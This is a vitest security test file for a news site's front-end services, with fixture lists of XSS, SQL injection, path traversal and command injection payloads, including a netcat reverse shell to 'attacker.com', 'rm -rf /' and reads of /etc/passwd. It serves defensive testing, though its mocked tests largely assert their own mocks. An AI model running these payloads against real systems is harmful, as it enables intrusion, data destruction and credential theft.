import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { authService } from '../services/auth';
import { articlesService } from '../services/articles';
import { categoriesService } from '../services/categories';
import { authorsService } from '../services/authors';
import { imagesService } from '../services/images';
import { api } from '../services/api';

// Mock all services
vi.mock('../services/auth');
vi.mock('../services/articles');
vi.mock('../services/categories');
vi.mock('../services/authors');
vi.mock('../services/images');

// Security testing utilities
class SecurityTestUtils {
  static generateMaliciousPayloads() {
    return {
      xss: [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">',
        '&lt;script&gt;alert("XSS")&lt;/script&gt;'
      ],
      sqlInjection: [
        "'; DROP TABLE articles; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'password'); --",
        "' OR 1=1 --",
        "admin'--"
      ],
      pathTraversal: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd'
      ],
      commandInjection: [
        '; cat /etc/passwd',
        '| whoami',
        '&& rm -rf /',
        '`cat /etc/passwd`',
        '$(cat /etc/passwd)',
        '; nc -e /bin/sh attacker.com 4444'
      ],
      oversizedInput: 'A'.repeat(10000),
      nullBytes: 'test\x00.jpg',
      unicodeBypass: '\u003cscript\u003ealert("XSS")\u003c/script\u003e'
    };
  }

  static generateInvalidTokens() {
    return [
      '', // Empty token
      'invalid-token', // Invalid format
      'Bearer invalid-token', // Invalid with Bearer prefix
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature', // Invalid signature
      'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.', // None algorithm
      'a'.repeat(1000), // Oversized token
      null as any, // Null token
      undefined as any // Undefined token
    ];
  }

  static generateRoleEscalationPayloads() {
    return [
      { role: 'admin', userId: 'different-user-id' },
      { role: 'super-admin', userId: 'current-user-id' },
      { role: 'system', userId: 'current-user-id' },
      { permissions: ['*'], userId: 'current-user-id' },
      { isAdmin: true, userId: 'current-user-id' }
    ];
  }
}

describe('Security Testing', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    localStorage.clear();
  });

  afterEach(() => {
    vi.restoreAllMocks();
    localStorage.clear();
  });

  describe('Authentication and Authorization Security', () => {
    it('should reject invalid authentication attempts', async () => {
      const invalidCredentials = [
        { email: '', password: '' },
        { email: 'admin@test.com', password: '' },
        { email: '', password: 'password' },
        { email: 'invalid-email', password: 'password' },
        { email: 'admin@test.com', password: 'wrong-password' },
        { email: SecurityTestUtils.generateMaliciousPayloads().xss[0], password: 'password' },
        { email: 'admin@test.com', password: SecurityTestUtils.generateMaliciousPayloads().sqlInjection[0] }
      ];

      for (const credentials of invalidCredentials) {
        vi.mocked(authService.login).mockRejectedValue({
          response: { status: 401, data: { message: 'Invalid credentials' } }
        });

        try {
          await authService.login(credentials);
          expect(true).toBe(false); // Should not reach here
        } catch (error: any) {
          expect(error.response?.status).toBe(401);
        }
      }
    });

    it('should validate JWT tokens properly', async () => {
      const invalidTokens = SecurityTestUtils.generateInvalidTokens();

      for (const token of invalidTokens) {
        if (token !== null && token !== undefined) {
          localStorage.setItem('auth_token', token);
        }

        vi.mocked(authService.getCurrentUser).mockRejectedValue({
          response: { status: 401, data: { message: 'Invalid token' } }
        });

        try {
          await authService.getCurrentUser();
          expect(true).toBe(false); // Should not reach here
        } catch (error: any) {
          expect(error.response?.status).toBe(401);
        }

        localStorage.removeItem('auth_token');
      }
    });

    it('should prevent role escalation attacks', async () => {
      const roleEscalationPayloads = SecurityTestUtils.generateRoleEscalationPayloads();
      
      // Mock current user as editor
      vi.mocked(authService.getCurrentUser).mockResolvedValue({
        success: true,
        data: {
          user: {
            id: 'current-user-id',
            email: 'editor@test.com',
            fullName: 'Editor User',
            role: 'editor',
            createdAt: '2024-01-01T00:00:00Z'
          }
        }
      });

      for (const payload of roleEscalationPayloads) {
        // Try to update user with escalated privileges
        vi.mocked(authService.updateProfile).mockRejectedValue({
          response: { status: 403, data: { message: 'Insufficient permissions' } }
        });

        try {
          await authService.updateProfile(payload);
          expect(true).toBe(false); // Should not reach here
        } catch (error: any) {
          expect(error.response?.status).toBe(403);
        }
      }
    });

    it('should handle session timeout properly', async () => {
      // Set expired token
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid';
      localStorage.setItem('auth_token', expiredToken);

      vi.mocked(authService.getCurrentUser).mockRejectedValue({
        response: { status: 401, data: { message: 'Token expired' } }
      });

      try {
        await authService.getCurrentUser();
        expect(true).toBe(false); // Should not reach here
      } catch (error: any) {
        expect(error.response?.status).toBe(401);
      }

      // Token should be cleared from localStorage
      expect(localStorage.getItem('auth_token')).toBeNull();
    });

    it('should prevent unauthorized access to protected routes', async () => {
      const protectedOperations = [
        () => articlesService.createArticle({ title: 'Test', content: 'Test', categoryId: '1', authorId: '1' }),
        () => articlesService.updateArticle('1', { title: 'Updated' }),
        () => articlesService.deleteArticle('1'),
        () => categoriesService.createCategory({ name: 'Test', slug: 'test', description: 'Test' }),
        () => authorsService.createAuthor({ fullName: 'Test', email: 'test@test.com' }),
        () => imagesService.uploadImage(new File(['test'], 'test.jpg', { type: 'image/jpeg' }))
      ];

      // Remove auth token
      localStorage.removeItem('auth_token');

      for (const operation of protectedOperations) {
        vi.mocked(operation).mockRejectedValue({
          response: { status: 401, data: { message: 'Unauthorized' } }
        });

        try {
          await operation();
          expect(true).toBe(false); // Should not reach here
        } catch (error: any) {
          expect(error.response?.status).toBe(401);
        }
      }
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should sanitize XSS attempts in article content', async () => {
      const maliciousPayloads = SecurityTestUtils.generateMaliciousPayloads();
      
      for (const xssPayload of maliciousPayloads.xss) {
        const articleData = {
          title: xssPayload,
          content: `<p>Normal content with ${xssPayload}</p>`,
          excerpt: xssPayload,
          categoryId: '1',
          authorId: '1'
        };

        vi.mocked(articlesService.createArticle).mockRejectedValue({
          response: { status: 400, data: { message: 'Invalid content detected' } }
        });

        try {
          await articlesService.createArticle(articleData);
          expect(true).toBe(false); // Should not reach here
        } catch (error: any) {
          expect(error.response?.status).toBe(400);
        }
      }
    });

    it('should prevent SQL injection in search queries', async () => {
      const maliciousPayloads = SecurityTestUtils.generateMaliciousPayloads();
      
      for (const sqlPayload of maliciousPayloads.sqlInjection) {
        vi.mocked(articlesService.getArticles).mockRejectedValue({
          response: { status: 400, data: { message: 'Invalid search query' } }
        });

        try {
          await articlesService.getArticles({ search: sqlPayload });
          expect(true).toBe(false); // Should not reach here
        } catch (error: any) {
          expect(error.response?.status).toBe(400);
        }
      }
    });

    it('should validate file uploads securely', async () => {
      const maliciousFiles = [
        new File(['<?php echo "hack"; ?>'], 'malicious.php', { type: 'application/x-php' }),
        new File(['<script>alert("xss")</script>'], 'malicious.html', { type: 'text/html' }),
        new File(['#!/bin/bash\nrm -rf /'], 'malicious.sh', { type: 'application/x-sh' }),
        new File(['test'], SecurityTestUtils.generateMaliciousPayloads().pathTraversal[0], { type: 'image/jpeg' }),
        new File(['test'], SecurityTestUtils.generateMaliciousPayloads().nullBytes, { type: 'image/jpeg' }),
        new File(['A'.repeat(100 * 1024 * 1024)], 'huge.jpg', { type: 'image/jpeg' }) // 100MB file
      ];

      for (const maliciousFile of maliciousFiles) {
        vi.mocked(imagesService.uploadImage).mockRejectedValue({
          response: { status: 400, data: { message: 'Invalid file type or content' } }
        });

        try {
          await imagesService.uploadImage(maliciousFile);
          expect(true).toBe(false); // Should not reach here
        } catch (error: any) {
          expect(error.response?.status).toBe(400);
        }
      }
    });

    it('should handle oversized input gracefully', async () => {
      const oversizedData = {
        title: SecurityTestUtils.generateMaliciousPayloads().oversizedInput,
        content: SecurityTestUtils.generateMaliciousPayloads().oversizedInput,
        excerpt: SecurityTestUtils.generateMaliciousPayloads().oversizedInput,
        categoryId: '1',
        authorId: '1'
      };

      vi.mocked(articlesService.createArticle).mockRejectedValue({
        response: { status: 413, data: { message: 'Payload too large' } }
      });

      try {
        await articlesService.createArticle(oversizedData);
        expect(true).toBe(false); // Should not reach here
      } catch (error: any) {
        expect(error.response?.status).toBe(413);
      }
    });

    it('should prevent command injection in file operations', async () => {
      const maliciousPayloads = SecurityTestUtils.generateMaliciousPayloads();
      
      for (const cmdPayload of maliciousPayloads.commandInjection) {
        const maliciousFile = new File(['test'], `image${cmdPayload}.jpg`, { type: 'image/jpeg' });

        vi.mocked(imagesService.uploadImage).mockRejectedValue({
          response: { status: 400, data: { message: 'Invalid filename' } }
        });

        try {
          await imagesService.uploadImage(maliciousFile);
          expect(true).toBe(false); // Should not reach here
        } catch (error: any) {
          expect(error.response?.status).toBe(400);
        }
      }
    });
  });

  describe('API Security', () => {
    it('should implement proper rate limiting', async () => {
      const rapidRequests = Array.from({ length: 100 }, () => 
        articlesService.getArticles({ page: 1, limit: 10 })
      );

      // Mock rate limiting response
      vi.mocked(articlesService.getArticles).mockImplementation(async () => {
        // Simulate rate limiting after many requests
        throw {
          response: { status: 429, data: { message: 'Too many requests' } }
        };
      });

      try {
        await Promise.all(rapidRequests);
        expect(true).toBe(false); // Should not reach here
      } catch (error: any) {
        expect(error.response?.status).toBe(429);
      }
    });

    it('should validate API request headers', async () => {
      const maliciousHeaders = [
        { 'X-Forwarded-For': '127.0.0.1, evil.com' },
        { 'User-Agent': SecurityTestUtils.generateMaliciousPayloads().xss[0] },
        { 'Referer': 'javascript:alert("xss")' },
        { 'Origin': 'http://evil.com' },
        { 'Content-Type': 'application/json; charset=utf-8; boundary=--evil' }
      ];

      for (const headers of maliciousHeaders) {
        // Mock API call with malicious headers
        const originalDefaults = api.defaults.headers;
        api.defaults.headers = { ...api.defaults.headers, ...headers };

        vi.mocked(articlesService.getArticles).mockRejectedValue({
          response: { status: 400, data: { message: 'Invalid request headers' } }
        });

        try {
          await articlesService.getArticles({ page: 1, limit: 10 });
          expect(true).toBe(false); // Should not reach here
        } catch (error: any) {
          expect(error.response?.status).toBe(400);
        } finally {
          api.defaults.headers = originalDefaults;
        }
      }
    });

    it('should prevent CSRF attacks', async () => {
      // Mock CSRF token validation
      const csrfToken = 'valid-csrf-token';
      
      // Test without CSRF token
      vi.mocked(articlesService.createArticle).mockRejectedValue({
        response: { status: 403, data: { message: 'CSRF token missing' } }
      });

      try {
        await articlesService.createArticle({
          title: 'Test Article',
          content: 'Test content',
          categoryId: '1',
          authorId: '1'
        });
        expect(true).toBe(false); // Should not reach here
      } catch (error: any) {
        expect(error.response?.status).toBe(403);
      }

      // Test with invalid CSRF token
      vi.mocked(articlesService.createArticle).mockRejectedValue({
        response: { status: 403, data: { message: 'Invalid CSRF token' } }
      });

      try {
        await articlesService.createArticle({
          title: 'Test Article',
          content: 'Test content',
          categoryId: '1',
          authorId: '1',
          _csrf: 'invalid-token'
        });
        expect(true).toBe(false); // Should not reach here
      } catch (error: any) {
        expect(error.response?.status).toBe(403);
      }
    });

    it('should handle CORS properly', async () => {
      const maliciousOrigins = [
        'http://evil.com',
        'https://malicious-site.com',
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'file:///etc/passwd'
      ];

      for (const origin of maliciousOrigins) {
        // Mock CORS validation
        vi.mocked(articlesService.getArticles).mockRejectedValue({
          response: { status: 403, data: { message: 'CORS policy violation' } }
        });

        // Simulate request from malicious origin
        Object.defineProperty(window, 'location', {
          value: { origin },
          writable: true
        });

        try {
          await articlesService.getArticles({ page: 1, limit: 10 });
          expect(true).toBe(false); // Should not reach here
        } catch (error: any) {
          expect(error.response?.status).toBe(403);
        }
      }
    });
  });

  describe('Data Protection and Privacy', () => {
    it('should not expose sensitive information in error messages', async () => {
      const sensitiveOperations = [
        () => authService.login({ email: 'admin@test.com', password: 'wrong-password' }),
        () => authService.getCurrentUser(),
        () => articlesService.getArticle('non-existent-id'),
        () => imagesService.uploadImage(new File(['test'], 'test.php', { type: 'application/x-php' }))
      ];

      for (const operation of sensitiveOperations) {
        vi.mocked(operation).mockRejectedValue({
          response: { 
            status: 400, 
            data: { 
              message: 'Operation failed', // Generic message
              // Should not contain: database paths, internal IDs, system info, etc.
            } 
          }
        });

        try {
          await operation();
          expect(true).toBe(false); // Should not reach here
        } catch (error: any) {
          const errorMessage = error.response?.data?.message || '';
          
          // Should not contain sensitive information
          expect(errorMessage).not.toMatch(/\/var\/www/);
          expect(errorMessage).not.toMatch(/database/i);
          expect(errorMessage).not.toMatch(/mysql/i);
          expect(errorMessage).not.toMatch(/mongodb/i);
          expect(errorMessage).not.toMatch(/password/i);
          expect(errorMessage).not.toMatch(/secret/i);
          expect(errorMessage).not.toMatch(/token/i);
          expect(errorMessage).not.toMatch(/internal/i);
        }
      }
    });

    it('should sanitize user data in responses', async () => {
      const userData = {
        id: '1',
        email: 'user@test.com',
        fullName: 'Test User',
        role: 'editor',
        // Should not include sensitive fields like password, salt, etc.
        createdAt: '2024-01-01T00:00:00Z'
      };

      vi.mocked(authService.getCurrentUser).mockResolvedValue({
        success: true,
        data: { user: userData }
      });

      const response = await authService.getCurrentUser();
      
      expect(response.success).toBe(true);
      expect(response.data.user).toBeDefined();
      
      // Should not contain sensitive fields
      expect(response.data.user).not.toHaveProperty('password');
      expect(response.data.user).not.toHaveProperty('passwordHash');
      expect(response.data.user).not.toHaveProperty('salt');
      expect(response.data.user).not.toHaveProperty('resetToken');
      expect(response.data.user).not.toHaveProperty('sessionId');
    });

    it('should validate data integrity', async () => {
      const tamperedData = {
        id: '1',
        title: 'Original Title',
        content: 'Original Content',
        // Tampered fields
        authorId: 'different-author-id',
        createdAt: new Date().toISOString(), // Future date
        views: -1000, // Negative views
        status: 'invalid-status'
      };

      vi.mocked(articlesService.updateArticle).mockRejectedValue({
        response: { status: 400, data: { message: 'Data integrity violation' } }
      });

      try {
        await articlesService.updateArticle('1', tamperedData);
        expect(true).toBe(false); // Should not reach here
      } catch (error: any) {
        expect(error.response?.status).toBe(400);
      }
    });
  });

  describe('Security Headers and Configuration', () => {
    it('should enforce secure communication', async () => {
      // Test HTTPS enforcement
      const insecureUrl = 'http://example.com/api/articles';
      
      vi.mocked(articlesService.getArticles).mockRejectedValue({
        response: { status: 400, data: { message: 'HTTPS required' } }
      });

      // Mock insecure request
      const originalBaseURL = api.defaults.baseURL;
      api.defaults.baseURL = insecureUrl;

      try {
        await articlesService.getArticles({ page: 1, limit: 10 });
        expect(true).toBe(false); // Should not reach here
      } catch (error: any) {
        expect(error.response?.status).toBe(400);
      } finally {
        api.defaults.baseURL = originalBaseURL;
      }
    });

    it('should validate content security policy', async () => {
      // Mock CSP violation
      const cspViolation = {
        'blocked-uri': 'eval',
        'document-uri': 'https://dominicanews.com',
        'violated-directive': 'script-src'
      };

      // Simulate CSP violation report
      const cspReportEndpoint = '/api/csp-report';
      
      vi.mocked(fetch).mockRejectedValue({
        response: { status: 400, data: { message: 'CSP violation detected' } }
      });

      try {
        await fetch(cspReportEndpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(cspViolation)
        });
        expect(true).toBe(false); // Should not reach here
      } catch (error: any) {
        // CSP violations should be properly handled
        expect(error.response?.status).toBe(400);
      }
    });
  });

  describe('Vulnerability Assessment', () => {
    it('should be resistant to timing attacks', async () => {
      const validEmail = 'admin@dominicanews.com';
      const invalidEmail = 'nonexistent@test.com';
      const password = 'test-password';

      const timingTests = [];

      // Test valid email with wrong password
      for (let i = 0; i < 10; i++) {
        const startTime = performance.now();
        
        vi.mocked(authService.login).mockRejectedValue({
          response: { status: 401, data: { message: 'Invalid credentials' } }
        });

        try {
          await authService.login({ email: validEmail, password });
        } catch (error) {
          // Expected to fail
        }
        
        const endTime = performance.now();
        timingTests.push(endTime - startTime);
      }

      // Test invalid email
      for (let i = 0; i < 10; i++) {
        const startTime = performance.now();
        
        vi.mocked(authService.login).mockRejectedValue({
          response: { status: 401, data: { message: 'Invalid credentials' } }
        });

        try {
          await authService.login({ email: invalidEmail, password });
        } catch (error) {
          // Expected to fail
        }
        
        const endTime = performance.now();
        timingTests.push(endTime - startTime);
      }

      // Response times should be similar to prevent timing attacks
      const avgTime = timingTests.reduce((sum, time) => sum + time, 0) / timingTests.length;
      const maxDeviation = Math.max(...timingTests.map(time => Math.abs(time - avgTime)));
      
      // Timing deviation should be minimal (within 100ms)
      expect(maxDeviation).toBeLessThan(100);
    });

    it('should prevent information disclosure', async () => {
      const probeRequests = [
        '/api/admin/users',
        '/api/admin/logs',
        '/api/admin/config',
        '/api/admin/database',
        '/api/admin/system-info',
        '/api/.env',
        '/api/package.json',
        '/api/config/database.js'
      ];

      for (const endpoint of probeRequests) {
        vi.mocked(fetch).mockRejectedValue({
          response: { status: 404, data: { message: 'Not found' } }
        });

        try {
          await fetch(endpoint);
          expect(true).toBe(false); // Should not reach here
        } catch (error: any) {
          // Should return generic 404, not reveal system information
          expect(error.response?.status).toBe(404);
          expect(error.response?.data?.message).toBe('Not found');
        }
      }
    });

    it('should handle security edge cases', async () => {
      const edgeCases = [
        { name: 'null-byte-injection', payload: 'test\x00.jpg' },
        { name: 'unicode-normalization', payload: '\u0041\u0300' }, // À
        { name: 'double-encoding', payload: '%253Cscript%253E' },
        { name: 'mixed-encoding', payload: '%3Cscript%3E' },
        { name: 'case-variation', payload: '<ScRiPt>' }
      ];

      for (const testCase of edgeCases) {
        vi.mocked(articlesService.createArticle).mockRejectedValue({
          response: { status: 400, data: { message: 'Invalid input detected' } }
        });

        try {
          await articlesService.createArticle({
            title: testCase.payload,
            content: `Content with ${testCase.payload}`,
            categoryId: '1',
            authorId: '1'
          });
          expect(true).toBe(false); // Should not reach here
        } catch (error: any) {
          expect(error.response?.status).toBe(400);
        }
      }
    });
  });
});